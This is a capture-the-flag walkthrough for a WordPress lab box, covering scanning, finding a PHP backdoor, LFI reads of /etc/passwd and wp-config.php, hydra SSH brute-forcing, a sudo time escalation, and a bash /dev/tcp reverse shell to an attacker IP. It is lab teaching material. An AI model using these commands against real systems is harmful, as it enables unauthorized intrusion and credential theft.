# Capture the Flag Walkthrough - Detailed Initial Steps

## Network Setup & Reasoning

### Machine Configuration
1. **Attacker Machine (Kali)**
   - Two network adapters:
     - Host-only adapter (target machine communication)
     - NAT adapter (internet access for tools/packages)

2. **Target Machine**
   - Single network adapter (host-only)

### Why Host-Only Networking?
- **Key Advantage**: Automatic DHCP distribution
- **Contrast**: Internal Networks don't inherently handle DHCP
- **Practical Benefit**: No need for initial target box access to configure networking

## Target Discovery & Port Scanning

### Finding Your IP
```bash
hostname -I
```
**Important Note**: You'll likely see two IPs:
- Public IP (NAT interface)
- Private IP (Host-only interface)
- **Use the private IP for this challenge**

### Initial Network Scan
```bash
sudo nmap -v --min-rate 10000 $targetIP/24 | grep open
```
**Note**: Replace $targetIP with your host IP from step 1

### Detailed Port Scan
```bash
sudo nmap -v -sV -sC -oN nmap $targetIP
```
**Parameter Breakdown**:
- `-v`: Verbose output for detailed information
- `-sV`: Service versioning (e.g., identifies Apache 2.4.41 instead of just "port 80 open")
- `-sC`: Script scan (runs default scripts to identify common vulnerabilities)
- `-oN`: Output Normal format (creates readable reference file)

**Scan Results**:
- Port 80: Apache HTTP
- Port 22: OpenSSH
- Initial focus: Web service (SSH offers limited initial attack surface)

## Web Application Analysis

### Initial Frontend Investigation
1. Navigate to `http://$targetIP`
2. **Key Observation**: Plain HTML display suggests either:
   - Non-existent/inexperienced frontend developer
   - CSS resolution issues

### Source Code Analysis
1. **WordPress Indicators**:
   - Explicit comment: "Proudly powered by WordPress"
   - DNS prefetch: `//s.w.org` (WordPress's static resource CDN)

### Troubleshooting CSS Issues (To verify we're not resolving correctly to redrocks.win)
1. **Using Browser Dev Tools (F12)**:
   - Check Network tab
   - Look for failed CSS file requests
   - Note domain: `redrocks.win`

2. **DNS Resolution Fix**:
   ```bash
   # Add to /etc/hosts:
   $targetIP    redrocks.win
   ```

## Discovering the Backdoor

### Initial Clues
1. **"Hello Blue" Link Analysis**:
   - Source code reveals "Looking For It?" (oddly capitalized)
   - Suggests potential Local File Inclusion (LFI) vulnerability

2. **Key References in Code**:
   - Mr. Miessler → Author of Seclists (security assessment collections)
   - Mention of inability to read → Hints at LFI backdoor
   - Environment: Apache PHP (WordPress standard)

### Install Seclists (only necessary if not present on system)
```bash
sudo apt install seclists
```

### Backdoor Hunt Using Gobuster
```bash
gobuster dir -w /usr/share/seclists/Discovery/Web-Content/CommonBackdoors-PHP.fuzz.txt \
    -x .php -u http://redrocks.win/ -o dir80.txt -z
```

**Result Found**:
```
/NetworkFileManagerPHP.php (Status: 500) [Size: 0]
```

### Result Analysis
- Google search for "NetworkFileManagerPHP.php" reveals:
  - GitHub results mentioning webshells
  - Direct reference in seclists
  - Likely being used as LFI backdoor (confirmed by earlier hint)

In this stage, we'll delve into the web application running on the target machine. Our goal is to uncover a hidden backdoor that will allow us to gain access.

### Identifying the Backdoor

1.  **Google Search:** We start by searching for the identified file, `NetworkFileManagerPHP.php`, on Google. This search leads us to a GitHub repository containing various web shells, including the one we're interested in.

2.  **Web Shell Basics:** A web shell is a malicious script that grants remote access and control over a web server. It's often used by attackers to execute commands, upload files, and manipulate the server environment.

3.  **LFI Hint:** Based on the provided hint, we suspect that this web shell is being used in conjunction with a Local File Inclusion (LFI) vulnerability. LFI allows an attacker to trick the web application into including local files from the server, potentially leading to unauthorized access or code execution.

### Testing for LFI

1.  **WFUZZ:** To test our LFI theory, we utilize a tool called `wfuzz`. This tool helps us send a series of requests to the web application, fuzzing different parameters to identify potential vulnerabilities.

2.  **Fuzzing Results:** After running `wfuzz`, we discover a parameter named "key" that seems promising. This parameter might be vulnerable to LFI.

3.  **LFI Attempt:** To confirm our suspicion, we craft a request that includes a known file path (`/etc/passwd`) through the "key" parameter. This file typically contains user information on Linux systems.

4.  **Successful LFI:** If our LFI attempt is successful, the web application will respond with the contents of the `/etc/passwd` file, confirming the vulnerability and giving us valuable information about the system's users.




## Exploiting the LFI Vulnerability

Now that we've confirmed the Local File Inclusion (LFI) vulnerability, let's explore how we can leverage it to gain further access to the target system.

### Extracting System Information

1.  **Targeting /etc/passwd:**  We can use the identified LFI vulnerability to read the contents of the `/etc/passwd` file. This file stores essential information about user accounts on the system, including usernames, user IDs, and their corresponding shells.

2.  **Analyzing /etc/passwd Output:** The output reveals a list of users present on the system, including `root`, `daemon`, `bin`, and others. Each line represents a user and provides details like their home directory and default shell.

### Identifying WordPress Configuration

1.  **WordPress Focus:** Since the target website appears to be running WordPress, we shift our attention to potential WordPress-related vulnerabilities.

2.  **wp-config.php:** A crucial file in WordPress installations is `wp-config.php`. This file stores sensitive information, including database credentials. We aim to access this file using the LFI vulnerability.

3.  **Tools for Analysis:** Tools like Burp Suite, a web proxy, and PHP wrappers can be instrumental in analyzing the vulnerable code and potentially accessing the `wp-config.php` file.

4.  **Examining NetworkFileManager.php:** We'll examine the `NetworkFileManager.php` file, which likely contains the vulnerable code responsible for the LFI. Understanding this code can help us craft precise requests to access sensitive files like `wp-config.php`.

## Decrypting the Hidden Clue

While analyzing the `NetworkFileManagerPHP.php` file, we encounter an intriguing Base64-encoded comment. Decoding it reveals a message: "That password alone won't help you! Hashcat says rules are rules."

### Unraveling the Message

1.  **Hashcat Hint:** This message hints at the usage of Hashcat, a popular password cracking tool. It suggests that the password we've encountered might be subject to specific rules or mutations.

2.  **Best64 Rule:** Based on the clue, we can infer that the password might have been transformed using Hashcat's "Best64" rule, which applies various common mutations to passwords.

3.  **Targeting wp-config.php Password:** Given the context, the password in question is likely the one protecting the WordPress database credentials stored in the `wp-config.php` file.

### Accessing wp-config.php

1.  **Base64 Encoding:** To access the `wp-config.php` file through the LFI vulnerability, we need to bypass security measures. One approach is to encode the file path using Base64 encoding.

2.  **PHP Filter:** We can utilize a PHP filter, `php://filter/convert.base64-encode/resource=`, to encode the `wp-config.php` file path before sending it as part of the LFI request.

3.  **Decoding the Response:** The server's response will contain the Base64-encoded content of the `wp-config.php` file. We'll need to decode it to reveal the actual file content.

### Extracting Database Credentials

1.  **Analyzing wp-config.php:** Once we have the decoded `wp-config.php` content, we can extract the database credentials, including the username, password, and database name.

2.  **Database User Confirmation:** We can cross-reference the extracted database username with the information obtained from the `/etc/passwd` file to confirm its existence on the system.

# Unraveling the Mystery

## Decoding the Encrypted Message

* **Encoded Text:** We have an encoded message that needs to be deciphered.
* **Analyzing the Encoding:** The encoding appears to be Base64.
* **Decoding with CyberChef:** We can use CyberChef to decode the Base64 message.
* **The Hidden Message:** The decoded message reads: "Good job so far! Now try to find a way to get a shell. Maybe you can include a file that will give you a reverse shell?"

## Understanding the Challenge

* **Remote Code Execution (RCE):** The challenge hints at finding a way to execute code on the target system.
* **Reverse Shell:** The message suggests aiming for a reverse shell, which allows us to gain control of the target system by having it connect back to our machine.
* **File Inclusion Vulnerability:** The mention of "include a file" likely indicates a file inclusion vulnerability that we can exploit.

## Exploring Potential Exploits

* **PHP Wrappers:** PHP wrappers like `php://input` can be used to potentially execute code.
* **Crafting a Payload:** We need to create a payload that will establish a reverse shell when included.
* **Netcat Listener:** Set up a Netcat listener on our machine to receive the incoming connection from the reverse shell.

## Executing the Exploit

* **Delivering the Payload:**  Find a way to deliver the reverse shell payload through the file inclusion vulnerability.
* **Triggering the Payload:**  Ensure the included payload is executed on the target system.
* **Catching the Shell:** If successful, our Netcat listener should catch the reverse shell connection, granting us control of the target system.

# Cracking the Password

## Utilizing Hashcat

* **Saving the Password:**  Store the known password in a file (`pass.txt`).
* **Applying Hashcat Rules:**
    * Use `hashcat --stdout` with the `best64.rule` to generate password variations.
    * This command processes the password from `pass.txt` and applies mutations based on the rule.
    * The output (password variations) is saved in `passlist.txt`.

## Identifying the Correct Password

* **Hydra for Password Testing:**
    * Use `hydra -l john -P passlist.txt 11.0.2.5 ssh` to test the passwords against the SSH service on the target machine (11.0.2.5).
    * Hydra attempts to log in with the username 'john' and each password from `passlist.txt`.

## Gaining Access

* **Successful Login:** Hydra identifies the correct password from the generated variations.
* **SSH Connection:**
    * Use `ssh john@11.0.2.5` to connect to the target machine via SSH with the discovered password.
    * Access granted!

# Red's Defense Mechanisms

## Distractions

* **Annoying Messages:** Red is sending distracting messages approximately every minute.
* **Forced Logout:** After 5 minutes, Red kicks you out and changes the password.

## Password Cracking Attempts

* **Hydra:** Hydra is used to brute-force the SSH password.
* **Password Found:**  Hydra successfully finds the correct password.
* **SSH Login:**  SSH login is successful, but Red continues to send messages and eventually closes the connection.
* **Repeated Hydra Attempts:** Hydra is used again to find the new password after Red changes it.

## System Manipulation

* **`vi/vim` Replaced:** Red has replaced `vi/vim` with `cat`, making file editing more difficult.

## Privilege Escalation Potential

* **`sudo -l` Output:**
    *  The `sudo -l` command reveals that the user 'john' can execute `/usr/bin/time` as the user 'ippsec' without a password.
    * This might be a potential avenue for privilege escalation.


# Escalating Privileges

## Gtfobins and `sudo`

* **Exploiting `sudo`:**
    *  Use the command `sudo -u ippsec /usr/bin/time /bin/bash` to gain access to a shell as the user 'ippsec'.
    * This exploits the `sudo` vulnerability identified earlier.

## Investigating the 'ippsec' User

* **Fake Flag:**
    * A file named `user.txt` in 'ippsec's home directory contains a fake flag and a message from Red.
* **Searching for Clues:**
    * Use the command `find / -group ippsec -type d 2>/dev/null | grep -v proc` to find directories accessible to the 'ippsec' group.
    * This reveals a `.git` directory in `/var/www/wordpress`.

## Exploring the `.git` Directory

* **Write Access:**
    * The 'ippsec' group has write access to the `.git` directory.
* **Secret Files:**
    * The `.git` directory contains two files: `rev` and `supersecretfileuc.c`.
    * `supersecretfileuc.c` contains a simple C program that prints "Get out of here Blue!".
    * `rev` appears to be an executable file.

### Initial Access
```bash
hydra -l john -P passlist.txt 192.168.56.102 ssh
sshpass -p 'CURRENT_PASSWORD' ssh john@192.168.56.102
```

### Privilege Escalation Setup
```bash
sudo -u ippsec /usr/bin/time /bin/bash
cd /dev/shm/
```

### Creating Reverse Shell
1. **Create shell script:**
```bash
echo '#!/bin/bash
bash -c '\''bash -i >& /dev/tcp/192.168.56.101/9001 0>&1'\''' > shell.sh
chmod +x shell.sh
```

2. **Set up listener (on attacking machine):**
```bash
nc -lvnp 9001
```

3. **Execute shell (on target machine):**
```bash
./shell.sh
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

### Terminal Stabilization
```bash
# Press ctrl+z
stty raw -echo;fg
# Press ENTER twice
export TERM=xterm
```

## Advanced Privilege Escalation with pspy

### On Attacking Machine
```bash
# Download pspy (using v1.2.0 due to GLIBC compatibility)
wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64s

# Start temporary HTTP server
python3 -m http.server 80
```

### On Target Machine
```bash
wget [TARGETMACHINE IP]/pspy64s
chmod +x pspy64s
./pspy64s
```

## Important Notes
- Always ensure you have proper authorization before performing penetration testing
- These commands should be used responsibly and ethically
- Some steps may need to be adjusted based on specific target configurations
- Always verify commands before execution to prevent unintended consequences

[Additional steps to be documented based on specific CTF requirements]
